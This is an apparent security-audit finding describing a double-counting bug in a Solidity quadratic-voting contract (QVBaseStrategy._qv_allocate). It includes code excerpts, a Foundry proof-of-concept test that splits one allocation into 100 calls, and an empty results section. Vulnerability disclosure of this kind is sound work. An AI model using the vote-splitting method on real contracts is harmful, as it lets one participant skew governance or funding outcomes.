# Malicious user can split the vote in QVBaseStrategy to get more votes.
Incorrect calculation of `voiceCreditsCastToRecipient` in `_qv_allocate` of `QVBaseStrategy`, resulting in more votes than intended.
## Vulnerability Detail

The `_qv_allocate` is performed as follows.

1. Gets the current credit spent by the `sender` on `_recipientId` and the current vote count for `_recipientId`.

```solidity
// get the previous values
uint256 creditsCastToRecipient = _allocator.voiceCreditsCastToRecipient[_recipientId];
uint256 votesCastToRecipient = _allocator.votesCastToRecipient[_recipientId];
```

2. Add the credit already used for `_recipientId` and the credit to be used this time and store it in `totalCredits`, and sqrt the result in `voteResult`.

```solidity
// get the total credits and calculate the vote result
uint256 totalCredits = _voiceCreditsToAllocate + creditsCastToRecipient;
uint256 voteResult = _sqrt(totalCredits * 1e18);
```

3. Subtract the amount of votes already cast by the sender from `voteResult` to get the votes for this credit. Add this to `totalRecipientVotes`, `_recipient.totalVotesReceived`

```solidity
voteResult -= votesCastToRecipient;
totalRecipientVotes += voteResult;
_recipient.totalVotesReceived += voteResult;
```

4. Add `totalCredits` to `_allocator.voiceCreditsCastToRecipient` and `voteResult` to `_allocator.votesCastToRecipient`.

```solidity
_allocator.voiceCreditsCastToRecipient[_recipientId] += totalCredits;
_allocator.votesCastToRecipient[_recipientId] += voteResult;
```

The vulnerability exists in #4, where `totalCredits` is the sum of the previously used credit and the credit to be used, as seen in #2. Since `_allocator.voiceCreditsCastToRecipient` already stores the value of the previously used credit, the result is that the previously used credit is added twice.

POC:

Normal case: 

If user allocated 100 at once

```solidity
[PASS] test_allocate_manipulate() (gas: 304252)
Logs:
  voiceCreditsCastToRecipient 100
  votesCastToRecipient 10000000000
```

Test code:

```solidity
function test_allocate_manipulate() public {
        address recipientId = __register_accept_recipient();
        address allocator = randomAddress();

        vm.startPrank(pool_manager2());
        qvSimpleStrategy().addAllocator(allocator);

        vm.warp(allocationStartTime + 10);
        bytes memory allocateData;

        vm.stopPrank();

        for(uint256 i =0;i<100;i++) {
            allocateData = __generateAllocation(recipientId, i+1);
            vm.prank(address(allo()));
            qvSimpleStrategy().allocate(allocateData, allocator);
        }
    }
```

Result:

## Impact
This can be exploited to manipulate voting by allowing much more votes to be cast for the same amount of credits.
